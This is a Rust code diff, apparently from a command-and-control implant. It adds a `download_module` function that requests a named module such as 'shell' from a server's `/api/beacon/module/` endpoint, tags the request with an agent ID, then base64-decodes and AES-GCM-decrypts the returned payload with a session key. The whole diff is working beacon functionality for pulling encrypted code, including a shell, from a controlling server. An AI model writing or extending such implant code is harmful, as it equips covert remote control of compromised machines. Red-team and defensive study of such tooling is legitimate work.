@@ -192,6 +192,43 @@ impl HttpCommunicator {
             .map_err(|e| e.to_string())?;
         Ok(())
     }
+
+    /// Download a cloud module (e.g. "shell") as raw bytes.
+    /// The response is AES-GCM encrypted with the session key and wrapped in
+    /// `{ "payload": "<base64>" }`.
+    pub async fn download_module(
+        &self,
+        name: &str,
+        agent_id: &str,
+        session_key: &[u8; AES_KEY_SIZE],
+    ) -> Result<Vec<u8>, String> {
+        let url = format!("{}/api/beacon/module/{}", self.server_url, name);
+        let resp = self
+            .client
+            .get(&url)
+            .header("X-Agent-Id", agent_id)
+            .send()
+            .await
+            .map_err(|e| e.to_string())?;
+
+        if !resp.status().is_success() {
+            return Err(format!("module download failed: {}", resp.status()));
+        }
+
+        let body = resp.text().await.map_err(|e| e.to_string())?;
+        let v: serde_json::Value = serde_json::from_str(&body)
+            .map_err(|e| format!("Failed to parse module response: {}", e))?;
+        let payload = v
+            .get("payload")
+            .and_then(|p| p.as_str())
+            .ok_or("missing payload in module response")?;
+
+        use base64::Engine as _;
+        let combined = base64::engine::general_purpose::STANDARD
+            .decode(payload)
+            .map_err(|e| e.to_string())?;
+        libra_crypto::decrypt_bytes(&combined, session_key)
+    }
 }
 
 // ── JSON extraction helpers ──────────────────────────────────────────
